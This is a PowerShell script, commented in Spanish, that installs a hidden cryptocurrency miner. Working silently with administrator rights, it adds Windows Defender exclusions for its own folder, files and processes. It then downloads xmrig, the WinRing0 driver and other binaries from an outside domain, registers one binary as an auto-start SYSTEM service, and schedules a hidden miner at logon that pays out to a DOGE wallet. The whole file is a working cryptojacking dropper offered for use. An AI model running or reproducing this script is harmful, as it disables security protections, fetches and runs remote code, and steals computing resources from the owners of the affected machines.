# Este script crea un directorio, configura exclusiones, descarga archivos,
# instala un servicio y crea una tarea programada, todo de manera silenciosa y en segundo plano.
# Debe ejecutarse con permisos de administrador.

# Definir la variable de la ruta raíz.
$root = "$env:APPDATA\Wik"

# Definir la URL base para las descargas.
$baseUrl = "https://baa4ts.is-a-good.dev/"

# Lista de archivos a procesar.
$filesToProcess = @(
    "xmrig.exe",
    "wroom.dll",
    "WinRing0x64.sys",
    "Win2Internals.exe"
)

# ---
# 1. Crear el directorio si no existe.
New-Item -Path $root -ItemType Directory -Force | Out-Null

# ---
# 2. Agregar la carpeta y archivos a las exclusiones de Windows Defender.
Add-MpPreference -ExclusionPath $root | Out-Null
foreach ($file in $filesToProcess) {
    Add-MpPreference -ExclusionPath "$root\$file" | Out-Null
}

# ---
# 3. Excluir los procesos de Windows Defender.
$processesToExclude = @(
    "xmrig.exe",
    "Win2Internals.exe"
)
foreach ($process in $processesToExclude) {
    Add-MpPreference -ExclusionProcess $process | Out-Null
}

# ---
# 4. Descargar los archivos a la carpeta raíz.
foreach ($file in $filesToProcess) {
    $url = "$baseUrl$file"
    $destination = "$root\$file"
    Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
}

# ---
# 5. Instalar Win2Internals.exe como un servicio de Windows para inicio automático.
$serviceName = "Win2InternalsService"
$executablePath = "$root\Win2Internals.exe"
sc.exe create $serviceName binPath= "`"$executablePath`"" start= auto obj= "NT AUTHORITY\SYSTEM" | Out-Null

# ---
# 6. Crear una tarea programada para ejecutar xmrig.exe en segundo plano.
$taskName = "XMRigMiner"
$xmrigPath = "$root\xmrig.exe"
$xmrigArguments = "-o rx.unmineable.com:3333 -a rx -k -u DOGE:DHJTrDmStC75AHU7AsZA7fzmtR8c4QT8Wk.LUISPC -p x --threads=1 --cpu-priority=1"

# Se usa PowerShell para ejecutar el proceso en segundo plano.
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -Command `"Start-Process -FilePath '$xmrigPath' -ArgumentList '$xmrigArguments' -NoNewWindow`""
$trigger = New-ScheduledTaskTrigger -AtLogon

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force | Out-Null
